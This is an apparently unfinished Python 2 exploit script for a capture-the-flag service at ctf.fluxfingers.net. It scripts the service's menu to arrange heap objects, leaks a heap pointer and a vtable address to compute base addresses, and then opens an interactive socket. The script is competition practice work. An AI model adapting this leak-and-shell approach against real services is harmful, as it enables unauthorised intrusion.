#! /usr/local/pyenv/shims/python
# _*_ coding: utf-8 _*_
import struct, socket, sys, os
import time, telnetlib, hexdump

def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delm='\n'):
  data = ''
  while not data.endswith(delm):
    data += f.readline()
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a):
  return struct.pack("<I", a&0xfffffff)

def u(a):
  return struct.unpack("<I", a)[0]

def xxd(a):
  hexdump.hexdump(a)

def countdown(n):
  for i in xrange(n, 0, -1):
    print str(i) + "..",
    sys.stdout.flush()
    time.sleep(1)
  print

def dbg(ss):
  print "[+] %s: 0x%x"%(ss, eval(ss))

if sys.argv[1] == 'r':
  HOST, PORT = "ctf.fluxfingers.net", 1340
else:
  HOST, PORT = "192.168.65.134", 27015

# ------------- menu --------------
B, L, S = 0, 1, 2
ON, OFF = 0, 1

def menu(r = ""):
  r += read_until(f, "[8] Quit\n\n")
  return r

def insert(type, time, slot, string):
  print "INSERT %d" % slot
  f.write("0\n")
  r = read_until(f, "[2] Semmel\n\n")
  f.write("%d\n" % type)
  r = read_until(f, ": \n\n")
  f.write("%d\n" % time)
  r = read_until(f, ": \n\n")
  f.write("%d\n" % slot)
  r = read_until(f, ": \n\n")
  f.write("%s\n" % string)
  return menu(r)

def remove(slot):
  print "REMOVE %d" % slot
  f.write("1\n")
  r = read_until(f, ":\n\n")
  f.write("%d\n" % slot)
  return menu(r)

def info(slot, type):
  print "INFO %d" % slot
  f.write("2\n")
  r = read_until(f, ":\n\n")
  f.write("%d\n" % slot)
  r = read_until(f, "[2] Semmel\n\n")
  f.write("%d\n" % type)
  return menu(r)
  
def edit(slot, string):
  print "EDIT %d" % slot
  f.write("3\n")
  r = read_until(f, ":\n\n")
  f.write("%d\n" % slot)
  r = read_until(f, ":\n\n")
  f.write("%s\n" % string)
  return menu(r)

def robot(onoff):
  if onoff == ON:
    print "ROBOT ON"
  elif onoff == OFF:
    print "ROBOT OFF"
  f.write("4\n")
  r = read_until(f, "[1] Stopn servicerobota\n\n")
  f.write("%d\n" % onoff)
  return menu(r)

def oven(onoff):
  if onoff == ON:
    print "OVEN ON"
    f.write("5\n")
    return menu(r)
  elif onoff == OFF:
    print "OVEN OFF"
    f.write("6\n")
    return menu()

# ----------- main -------------
s, f = sock(HOST, PORT)
if sys.argv[1] != 'r':
  raw_input("attach?")

menu()

# leak
insert(type=S, time=30, slot=0, string="DUMMY")
insert(type=S, time=30, slot=1, string="DUMMY")
#insert(type=S, time=30, slot=2, string="DUMMY")
#insert(type=S, time=30, slot=3, string="DUMMY")
insert(type=S, time=30, slot=2, string="LEAK1")
insert(type=L, time=30, slot=3, string="LEAK2")
r = info(slot=2, type=L)

heap = u(r[0x26b:0x26b+4])
heap_base = heap - 0x3970
vtable = u(r[0x27b:0x27b+4])
bin_base = vtable - 0x10f70
dbg("heap")
dbg("heap_base")
dbg("vtable")
dbg("bin_base")

shell(s)
  
